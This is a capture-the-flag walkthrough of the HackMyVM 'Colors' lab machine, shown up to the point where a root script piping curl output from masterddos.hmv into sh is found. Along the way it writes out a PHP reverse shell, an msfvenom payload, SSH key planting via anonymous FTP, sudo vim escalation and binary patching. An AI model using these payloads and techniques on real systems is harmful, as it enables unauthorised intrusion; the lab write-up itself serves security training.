# CTF Penetration Testing

## HackMyVM

### Colors - Machine

#### Machine Description

- Machine name: [Colors](https://hackmyvm.eu/machines/machine.php?vm=Colors)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Colors Machine Logo" width="150"/>

#### Tools Used

- arpspoof
- CyberChef
- dnsspoof
- Netcat
- Nmap
- Radare2
- Stegseek

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.130 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.130`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:51 EDT
Nmap scan report for 192.168.56.130
Host is up (0.00079s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3 ←
22/tcp filtered ssh ←
80/tcp open     http    Apache httpd 2.4.54 ((Debian)) ←
MAC Address: 08:00:27:BF:0D:E6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)

[**#Anonymous login**]
_anonymous : anonymous_ _anonymous :_ _ftp : ftp_
```
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
```

`mkdir ./ftp_files && cd ./ftp_files`
`ftp 192.168.56.130`:
```                  
Connected to 192.168.56.130.
220 (vsFTPd 3.0.3)
Name (192.168.56.130:kali): anonymous ←
331 Please specify the password.
Password: ←
230 Login successful. ←
Remote system type is UNIX.
Using binary mode to transfer files.
```
```
ftp> dir
229 Entering Extended Passive Mode (|||26965|)
150 Here comes the directory listing.
-rw-r--r--    1 1127     1127            0 Jan 27  2023 first
-rw-r--r--    1 1039     1039            0 Jan 27  2023 second
-rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg ←
-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
226 Directory send OK.
```
```
ftp> get secret.jpg ←
local: secret.jpg remote: secret.jpg
229 Entering Extended Passive Mode (|||44667|)
150 Opening BINARY mode data connection for secret.jpg (290187 bytes).
100% |************************************************************************************************************************************************|   283 KiB   22.43 MiB/s    00:00 ETA
226 Transfer complete.
290187 bytes received in 00:00 (20.09 MiB/s)
ftp> exit
221 Goodbye.
```

`file ./secret.jpg`:
```
./secret.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 735x588, components 3
```

`stegseek ./secret.jpg`:
``` 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Nevermind" ←
[i] Original filename: "more_secret.txt". ←
[i] Extracting to "secret.jpg.out". ←
```

`mv ./secret.jpg.out ./more_secret.txt`
`cat ./more_secret.txt`:
```
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```

`https://cyberchef.org/#recipe=From_Base85('!-u',true,'z')&input=PC1NbmtGRW8hU0FSVFYjK0QsWTREJzNfN0c5RDBMRldibUJDaHQ1J0FLWWkuRWItQShCbGReJUUsVEguRkNldSpAWDApPEJPcjwuQlBEP3NGISxSPEA8PFc7RGZtMTVCazIqL0Y8Rys0K0VWOipEQk5ENitFVjouK0UpLi9GISxhSEZXYjQvQTA%2BRSQvZyspMitFVjo7RGcqPUJBbkUwLUJPcjtxRGctIzNESW1sQStCKV1fQ2BtLzFAPGl1LUVjNWU7RkQsNS5GKCZabCtEPjIoQFctOT4rQEJSWkBxWyEsQk9yPC5FYWBLaStFcU87QTkvbC1EQk80Q0ZgSlVHQDswUCEvZypULUUsOUg1QU0sKW5FYi9aci9nKlByRig5LTNBVEJDMUUrczMqM2AnTy5DR14qL0JrSlw6`
`CyberChef Input`:
```
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```
`CyberChef Output`:
```
Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.
pink:Pink4sPig$$ ←
```

`ftp 192.168.56.130`:
```  
Connected to 192.168.56.130.
220 (vsFTPd 3.0.3)
Name (192.168.56.130:kali): pink ←
331 Please specify the password.
Password: ←
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
```
ftp> dir
229 Entering Extended Passive Mode (|||40827|)
150 Here comes the directory listing.
drwx------    2 1127     1127         4096 Feb 11  2023 green
drwx------    3 1000     1000         4096 Feb 11  2023 pink ←
drwx------    2 1081     1081         4096 Feb 20  2023 purple
drwx------    2 1039     1039         4096 Feb 11  2023 red
226 Directory send OK.
```
```
ftp> cd pink ←
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||32813|)
150 Here comes the directory listing.
drwx------    3 1000     1000         4096 Feb 11  2023 .
drwxr-xr-x    6 0        0            4096 Jan 27  2023 ..
lrwxrwxrwx    1 1000     1000            9 Jan 27  2023 .bash_history -> /dev/null
-rwx------    1 1000     1000          220 Jan 27  2023 .bash_logout
-rwx------    1 1000     1000         3526 Jan 27  2023 .bashrc
-rwx------    1 1000     1000          807 Jan 27  2023 .profile
drwx------    2 1000     1000         4096 Feb 11  2023 .ssh ←
-rwx------    1 1000     1000         3705 Feb 11  2023 .viminfo
-rw-r--r--    1 1000     1000           23 Feb 11  2023 note.txt ←
226 Directory send OK.
```
```
ftp> get note.txt ←
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||20566|)
150 Opening BINARY mode data connection for note.txt (23 bytes).
100% |************************************************************************************************************************************************|    23        1.21 MiB/s    00:00 ETA
226 Transfer complete.
23 bytes received in 00:00 (15.05 KiB/s)
```
```
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||33021|)
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 Feb 11  2023 .
drwx------    3 1000     1000         4096 Feb 11  2023 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```

`cat ./note.txt`:
```
nothing to see here...
```

`ssh-keygen -t rsa -b 4096 -f ./pink_rsa`:
```
Generating public/private rsa key pair. ←
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./pink_rsa
Your public key has been saved in ./pink_rsa.pub
The key fingerprint is:
SHA256:T0qQW1prWPJm/tiO7wOOAoLwy/+gjhknk9cD5HvAX7I kali@kali-vm
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|       .         |
|  .   + +        |
|.+     @ .       |
|o.= . = S .      |
|o.o* + *.+       |
|=o+oE  oo..      |
| Ooo.o. .=.      |
|o.o..o. o+*.     |
+----[SHA256]-----+
```

`ls -alps ./`:
```
total 308
  4 drwxrwxr-x 2 kali kali   4096 Sep 30 12:54 ./
  4 drwxrwxr-x 3 kali kali   4096 Sep 30 12:54 ../
  4 -rw-rw-r-- 1 kali kali    316 Sep 30 12:08 more_secret.txt
  4 -rw-r--r-- 1 kali kali     23 Feb 11  2023 note.txt
  4 -rw------- 1 kali kali   3381 Sep 30 12:51 pink_rsa
  4 -rw-r--r-- 1 kali kali    738 Sep 30 12:51 pink_rsa.pub ←
284 -rw-r--r-- 1 kali kali 290187 Feb 11  2023 secret.jpg
```

`ftp 192.168.56.130`:
```  
Connected to 192.168.56.130.
220 (vsFTPd 3.0.3)
Name (192.168.56.130:kali): pink ←
331 Please specify the password.
Password: ←
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
```
ftp> cd pink
250 Directory successfully changed.
ftp> cd .ssh
250 Directory successfully changed.
ftp> put pink_rsa.pub authorized_keys ←
local: pink_rsa.pub remote: authorized_keys
229 Entering Extended Passive Mode (|||44875|)
150 Ok to send data.
100% |************************************************************************************************************************************************|   738        2.81 MiB/s    00:00 ETA
226 Transfer complete.
738 bytes sent in 00:00 (369.21 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||15813|)
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 Sep 30 18:56 .
drwx------    3 1000     1000         4096 Feb 11  2023 ..
-rw-------    1 1000     1000          738 Sep 30 18:56 authorized_keys ←
226 Directory send OK.
ftp> exit
221 Goodbye.
```

`ssh -i ./pink_rsa pink@192.168.56.130`:
```
ssh: connect to host 192.168.56.130 port 22: Connection refused ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Pentesting IPv6](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/pentesting-ipv6)

[**#Networks**]
IPv6 addresses are structured to enhance network organization and device interaction. An IPv6 address is divided into:
1. **Network Prefix**: The initial 48 bits, determining the network segment.
2. **Subnet ID**: Following 16 bits, used for defining specific subnets within the network.
3. **Interface Identifier**: The concluding 64 bits, uniquely identifying a device within the subnet.
While IPv6 omits the ARP protocol found in IPv4, it introduces **ICMPv6** with two primary messages:
- **Neighbor Solicitation (NS)**: Multicast messages for address resolution.
- **Neighbor Advertisement (NA)**: Unicast responses to NS or spontaneous announcements.
IPv6 also incorporates special address types:
- **Loopback Address (**`**::1**`**)**: Equivalent to IPv4's `127.0.0.1`, for internal communication within the host.
- **Link-Local Addresses (**`**FE80::/10**`**)**: For local network activities, not for internet routing. Devices on the same local network can discover each other using this range.
**Practical Usage of IPv6 in Network Commands**
To interact with IPv6 networks, you can use various commands:
- **Ping Link-Local Addresses**: Check the presence of local devices using `ping6`.
- **Neighbor Discovery**: Use `ip neigh` to view devices discovered at the link layer.
- **alive6**: An alternative tool for discovering devices on the same network.
Below are some command examples:
```
ping6 –I eth0 -c 5 ff02::1 > /dev/null 2>&1
ip neigh | grep ^fe80

# Alternatively, use alive6 for neighbor discovery
alive6 eth0
```

`ping6 -I eth1 -c 3 -n ff02::1`:
```
ping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id => use: address%<ifname|scope-id>
ping6: Warning: source address might be selected on device other than: eth1
PING ff02::1 (ff02::1) from :: eth1: 56 data bytes
64 bytes from fe80::a50f:d743:435d:299a%eth1: icmp_seq=1 ttl=64 time=0.283 ms
64 bytes from fe80::a00:27ff:febf:de6%eth1: icmp_seq=1 ttl=64 time=0.756 ms ←
64 bytes from fe80::a50f:d743:435d:299a%eth1: icmp_seq=2 ttl=64 time=0.025 ms
64 bytes from fe80::a00:27ff:febf:de6%eth1: icmp_seq=2 ttl=64 time=0.793 ms
64 bytes from fe80::a50f:d743:435d:299a%eth1: icmp_seq=3 ttl=64 time=0.024 ms

--- ff02::1 ping statistics ---
3 packets transmitted, 3 received, +2 duplicates, 0% packet loss, time 2040ms
rtt min/avg/max/mdev = 0.024/0.376/0.793/0.338 ms ←
```

`ifconfig eth1`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link> ←
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 2444104  bytes 525026978 (500.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1388366  bytes 209142208 (199.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`nmap -6 -Pn -sSV -p- -T5 fe80::a00:27ff:febf:de6%eth1`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 13:11 EDT
Nmap scan report for fe80::a00:27ff:febf:de6
Host is up (0.00065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:BF:0D:E6 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
```

`ssh -6 -i ./pink_rsa pink@fe80::a00:27ff:febf:de6%eth1`:
```
Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 30 19:12:05 2024 from fe80::a50f:d743:435d:299a%enp0s3
```

![Victim: pink](https://img.shields.io/badge/Victim-pink-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
pink ←
```

`uname -a`:
```
Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /home/pink`
`ls -alps ./`:
```
total 32
4 drwx------ 3 pink pink 4096 Feb 11  2023 ./
4 drwxr-xr-x 6 root root 4096 Jan 27  2023 ../
0 lrwxrwxrwx 1 pink pink    9 Jan 27  2023 .bash_history -> /dev/null
4 -rwx------ 1 pink pink  220 Jan 27  2023 .bash_logout
4 -rwx------ 1 pink pink 3526 Jan 27  2023 .bashrc
4 -rw-r--r-- 1 pink pink   23 Feb 11  2023 note.txt
4 -rwx------ 1 pink pink  807 Jan 27  2023 .profile
4 drwx------ 2 pink pink 4096 Sep 30 18:56 .ssh/
4 -rwx------ 1 pink pink 3705 Feb 11  2023 .viminfo
```

`ls -alps /var/www/html`:
```
total 828
  4 drwxrwxrwx 2 www-data www-data   4096 Feb 11  2023 ./
  4 drwxr-xr-x 3 root     root       4096 Jan 27  2023 ../
  4 -rw-r--r-- 1 www-data www-data    295 Jan 27  2023 index.html
 12 -rw-r--r-- 1 www-data www-data  10701 Jan 27  2023 index.html.bak
804 -rw-r--r-- 1 www-data www-data 821574 Jan 27  2023 seized.png
```

`cd /var/www/html`
`cat ./index.html`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <img src="./seized.png" alt="">
</body>
</html>
```
`cat ./index.html.bak`:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

[...]

        <div class="section_header section_header_red">
          <div id="about"></div>
          It works!
        </div>
        <div class="content_section_text">
          <p>
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Debian systems.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>


          <p>
                If you are a normal user of this web site and don't know what this page is
                about, this probably means that the site is currently unavailable due to
                maintenance.
                If the problem persists, please contact the site's administrator.
          </p>

        </div>
        <div class="section_header">
          <div id="changes"></div>
                Configuration Overview
 
[...]

        <div class="section_header">
            <div id="docroot"></div>
                Document Roots
        </div>

        <div class="content_section_text">
            <p>
                By default, Debian does not allow access through the web browser to
                <em>any</em> file apart of those located in <tt>/var/www</tt>,
                <a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html" rel="nofollow">public_html</a>
                directories (when enabled) and <tt>/usr/share</tt> (for web
                applications). If your site is using a web document root
                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
            </p>
            <p>
                The default Debian document root is <tt>/var/www/html</tt>. You
                can make your own virtual hosts under /var/www. This is different
                to previous releases which provides better security out of the box.
            </p>
        </div>

[...]

  </body>
</html>
```

`ls -ld ./`:
```
drwxrwxrwx 2 www-data www-data 4096 Feb 11  2023 /var/www/html ←
```

`cat /etc/php/7.4/apache2/php.ini | grep 'disable_functions'`:
```
disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare, ←
```

`nc -lnvp 4444 > ./revsh.php`:
```
listening on [any] 4444 ... ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`echo '<?php $sock = fsockopen("192.168.56.118", 5555); $proc = proc_open("/bin/bash", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>' | tee ./revsh.php`:
```
<?php $sock = fsockopen("192.168.56.118", 5555); $proc = proc_open("/bin/bash", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>
```

🔄 Alternative Step.

`msfvenom -p php/reverse_php LHOST=192.168.56.118 LPORT=5555 -f raw > ./revsh.php`:
```
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2997 bytes
```

`cat ./revsh.php | nc 192.168.56.130 4444`

![Victim: pink](https://img.shields.io/badge/Victim-pink-64b5f6?logo=linux&logoColor=white)

```
connect to [192.168.56.130] from (UNKNOWN) [192.168.56.118] 48604 ←
```

`ls -alps ./`:
```
total 836
  4 drwxrwxrwx 2 www-data www-data   4096 Oct  1 11:23 ./
  4 drwxr-xr-x 3 root     root       4096 Jan 27  2023 ../
  4 -rw-r--r-- 1 www-data www-data    295 Jan 27  2023 index.html
 12 -rw-r--r-- 1 www-data www-data  10701 Jan 27  2023 index.html.bak
  4 -rw-r--r-- 1 pink     pink         20 Oct  1 09:23 info.php
  4 -rw-r--r-- 1 pink     pink        135 Oct  1 11:23 revsh.php ←
804 -rw-r--r-- 1 www-data www-data 821574 Jan 27  2023 seized.png
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 5555`:
```
listening on [any] 5555 ... ←
```

`curl http://192.168.56.130/revsh.php`

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.130] 56566 ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`whoami`:
```
www-data ←
```

`id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`sudo -l`:
```
Matching Defaults entries for www-data on color:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on color:
    (green) NOPASSWD: /usr/bin/vim ←
```

`ls -la /usr/bin/vim`:
```
lrwxrwxrwx 1 root root 21 Jan 27  2023 /usr/bin/vim -> /etc/alternatives/vim
```

`vim --version | grep -E 'python|lua'`:
```
+comments          +libcall           -python            +visual
+conceal           +linebreak         -python3           +visualextra
+cursorshape       -lua               -ruby              +wildmenu
```

<div>
	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
</div>

[vim](https://gtfobins.github.io/gtfobins/vim/)

[**#Sudo**]
If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
1. 
```
sudo vim -c ':!/bin/sh'
```
2. This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
```
sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
3. This requires that `vim` is compiled with Lua support.
```
sudo vim -c ':lua os.execute("reset; exec sh")'
```

`sudo -u green vim -c ':!/bin/bash'`

![Victim: green](https://img.shields.io/badge/Victim-green-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
green ←
```

`cd /home/green`
`ls -alps`:
```
total 48
 4 drwx------ 2 green green  4096 Oct  1 11:10 ./
 4 drwxr-xr-x 6 root  root   4096 Jan 27  2023 ../
 0 lrwxrwxrwx 1 root  root      9 Feb 11  2023 .bash_history -> /dev/null
 4 -rwx------ 1 green green   220 Jan 27  2023 .bash_logout
 4 -rwx------ 1 green green  3526 Jan 27  2023 .bashrc
 4 -rwx------ 1 green green   807 Jan 27  2023 .profile
 4 -rw------- 1 green green   533 Oct  1 11:10 .viminfo
 4 -rw-r--r-- 1 root  root    145 Feb 11  2023 note.txt
20 -rwxr-xr-x 1 root  root  16928 Feb 11  2023 test_4_green ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 6666 > ./test_4_green`:
```
listening on [any] 6666 ... ←
```

![Victim: green](https://img.shields.io/badge/Victim-green-64b5f6?logo=linux&logoColor=white)

`cat ./test_4_green | nc 192.168.56.118 6666`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.130] 77896 ←
```

`file ./test_4_green`:
```
test_4_green: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9496189c225509b7a26fbf1a874b3edeb9be0859, for GNU/Linux 3.2.0, not stripped ←
```

`strings ./test_4_green`:
```
[...]

Guess the number im thinking: 
Correct!! Here is the pass: ←
Nope, sorry
FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDReY6nognFSGKtS4zTEiVPgzDXnPj06WsScYlt0EFryMGvP8SjVsg9YjmxTeHkXUdzliZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqaCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKhaAWAR7kxJC8METsFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23haAWAR7kxJC8METFFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23

[...]
```

`r2 -w ./test_4_green`:
```
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
[0x000010b0]> V ←
```
```
p ←
```
```
0x0000122b    488d3d90d00.            lea rdi, str.Guess_the_number_im_thinking:   ; 0x2008 ; "Guess the number im thinking: "
0x00001232    b800000000              mov eax, 0
0x00001234    e817ffffff              call sym.imp.printf                         ; [1]
0x00001239    488d45f4                lea rax, [rbp - 0xc]
0x0000123d    4899c6                  mov rsi, rax
0x00001240    488d3de00d00.           lea rdi, [0x00002027]                       ; "%d"
0x00001247    b800000000              mov eax, 0
0x0000124c    e82ffffff               call sym.imp.__isoc99_scanf                 ; [2]
0x00001251    8b45f4                  mov eax, dword [rbp - 0xc]
0x00001254    3945f8                  cmp dword [rbp - 8], eax
0x00001257    7572                    jne 0x12cb ←
0x00001259    488d3dca0d00.           lea rdi, str.Correct___Here_is_the_pass:    ; 0x202a ; "Correct!! Here is the pass:" ←
0x00001260    e8dbfdffff              call sym.imp.puts                           ; [3]
```
```
[0x00001257 [xAdvc] 0 24% 230 ./test_4_green]> pd $r @ main+120 # 0x1257 ←
	0x00001257      7572           jne 0x12cb ←
	0x00001259      488d3dca0d00.  lea rdi, str.Correct___Here_is_the_pass:   ; 0x202a ; "Correct!! Here is the pass:"
	0x00001260      e8dbfdffff     call sym.imp.puts
```
```
Shift + a ←
```
```
Write some x86-64 assembly...

[VA:2]> je 0x12cb ←
* 7472
```
```
Save changes? (Y/n) Y ←
```
```
q
```

`chmod +x ./test_4_green`
`./test_4_green`:
```
Guess the number im thinking: 1
Correct!! Here is the pass:
purpleaslilas ←
```

![Victim: green](https://img.shields.io/badge/Victim-green-64b5f6?logo=linux&logoColor=white)

`su purple`:
```
Password: ←
```

![Victim: purple](https://img.shields.io/badge/Victim-purple-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
purple ←
```

`cd /home/purple`
`ls -alps`:
```
total 32
4 drwx------ 2 purple purple 4096 Feb 20  2023 ./
4 drwxr-xr-x 6 root   root   4096 Jan 27  2023 ../
0 lrwxrwxrwx 1 root   root      9 Feb 11  2023 .bash_history -> /dev/null
4 -rwx------ 1 purple purple  220 Jan 27  2023 .bash_logout
4 -rwx------ 1 purple purple 3526 Jan 27  2023 .bashrc
4 -rw-r--r-- 1 root   root     77 Feb 11  2023 for_purple_only.txt
4 -rwx------ 1 purple purple  807 Jan 27  2023 .profile
4 -rw-r--r-- 1 root   root     14 Feb 11  2023 user.txt ←
4 -rw------- 1 purple purple  868 Feb 20  2023 .viminfo
```

`cat ./user.txt`:
```
(:Ez_Colors:) ←
```

`cat ./for_purple_only.txt `:
```
As the highest level user I allow you to use the supreme ddos attack script. ←
```

`sudo -l`:
```
Matching Defaults entries for purple on color:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User purple may run the following commands on color:
    (root) NOPASSWD: /attack_dir/ddos.sh
```

`ls -la /attack_dir/ddos.sh`:
```
-rwxr--r-- 1 root root 75 Feb 11  2023 /attack_dir/ddos.sh ←
```

`cat /attack_dir/ddos.sh`:
```
#!/bin/bash
/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p ←
```

`cat /etc/nsswitch.conf`:
```
# /etc/nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the `glibc-doc-reference' and `info' packages installed, try:
